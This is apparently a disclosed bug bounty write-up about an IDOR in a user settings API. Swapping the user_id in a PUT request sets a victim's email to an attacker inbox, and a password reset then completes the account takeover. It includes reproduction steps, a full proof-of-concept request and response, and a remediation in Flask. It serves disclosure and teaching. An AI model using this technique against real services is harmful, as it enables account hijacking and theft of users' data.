---
layout: post
title: "Full Account Takeover via IDOR in User Settings API"
date: 2026-06-24
category: bugbounty
tags: [idor, account-takeover, api]
severity: high
target: target.com
program: hackerone
status: disclosed
permalink: /bugbounty/writeups/idor-account-takeover/
---

# Full Account Takeover via IDOR in User Settings API

## Summary

An Insecure Direct Object Reference (IDOR) was found in the user configuration update endpoint of `target.com`. The endpoint did not validate if the caller owned the profile being modified. As a result, an attacker could change any user's profile email address to their own, leading to a complete account takeover via the standard "Forgot Password" feature.

**Severity**: High (CVSS 8.5)  
**Reward**: $3,000  
**Program**: Target Bug Bounty Program (HackerOne)  

## Vulnerability Details

### Type
Insecure Direct Object Reference (IDOR) leading to Account Takeover

### Affected Endpoint
```
PUT /api/v2/users/settings/update
```

### Root Cause
The API backend extracted the target user identity from a JSON body parameter (`user_id`) instead of verifying the user identity from the cryptographically signed JWT token contained in the HTTP request authorization header.

## Steps to Reproduce

### Prerequisites
- Two registered accounts on `target.com`:
  - Attacker account (`user_id`: `10948`, email: `attacker@evil.com`)
  - Victim account (`user_id`: `10940`, email: `victim@target.com`)

### Reproduction Steps

1. **Capture Settings Update Request**: Log in as the attacker, navigate to settings, change a field (like preferred theme), and capture the request in Burp Suite.
2. **Modify Target User ID**: In the request body, locate the parameter `"user_id": 10948` and change it to the victim's ID `"user_id": 10940`.
3. **Change Email Parameter**: Add or modify the `"email"` field in the JSON body payload, setting it to an attacker-controlled inbox: `"email": "hacked-victim@evil.com"`.
4. **Send Request**: Send the intercepted request. The server replies with a HTTP 200 OK:
   ```json
   {
     "status": "success",
     "message": "User settings updated successfully"
   }
   ```
5. **Account Takeover**: Go to the login page of `target.com`, click "Forgot Password", input the updated email (`hacked-victim@evil.com`), and complete the reset flow to gain full access to the victim's profile.

## Proof of Concept

### HTTP Request
```http
PUT /api/v2/users/settings/update HTTP/1.1
Host: target.com
Authorization: Bearer attacker_jwt_token_here
Content-Type: application/json
Content-Length: 104

{
  "user_id": 10940,
  "theme": "dark",
  "notifications": true,
  "email": "hacked-victim@evil.com"
}
```

### HTTP Response
```http
HTTP/1.1 200 OK
Content-Type: application/json
Date: Wed, 24 Jun 2026 10:15:30 GMT
Connection: close

{
  "status": "success",
  "message": "User settings updated successfully"
}
```

## Impact

### What an Attacker Can Do
- Change the email addresses associated with any registered user account by iterating the sequential user IDs.
- Log in to administrator accounts or high-profile user profiles to access private data.

### Affected Data
- Personal identifiable information (PII) of all users.
- Billing configurations and account settings.

### Business Impact
- Serious privacy leaks triggering GDPR compliance concerns.
- Massive reputation damage if administrator accounts are hijacked.

## Remediation

### Recommended Fix
Never trust client-supplied user identifiers to determine permissions. Always fetch the authenticated session identity directly from the signed backend session token or JWT structure.

```python
# Secure settings modification backend logic
from flask import request, jsonify
from my_auth_library import decode_jwt

def secure_update_settings():
    auth_header = request.headers.get('Authorization')
    if not auth_header:
        return jsonify({"error": "Unauthorized"}), 401
    
    # Extract JWT token
    token = auth_header.split(" ")[1]
    decoded = decode_jwt(token)
    
    # Get user identity directly from the token, not the request body
    authenticated_user_id = decoded.get('user_id')
    
    # Load request data
    data = request.json
    
    # Execute update only for the authenticated session owner
    update_user_profile(user_id=authenticated_user_id, data=data)
    
    return jsonify({"status": "success", "message": "Profile updated"}), 200
```

### Security Controls
1. **Access Token Validation**: Validate claims inside backend routines directly against authentication states.
2. **UUID Implementation**: Implement non-predictable UUID v4 keys instead of sequential auto-incrementing integers for public entity IDs, adding a layer of defense-in-depth against resource enumeration.

## Timeline

| Date | Event |
|------|-------|
| 2026-06-24 | Vulnerability identified |
| 2026-06-24 | Bug report sent to target program |
| 2026-06-24 | Vulnerability verified and triaged as High |
| 2026-06-25 | Patch deployed to production API service |
| 2026-06-25 | Vulnerability resolved |
| 2026-06-25 | Bounty of $3,000 awarded |

## References
- [OWASP Broken Object Level Authorization (BOLA)](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [CWE-639: Access Control Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

---

**Disclaimer**: This writeup is published after responsible disclosure and with permission. All sensitive information has been redacted.
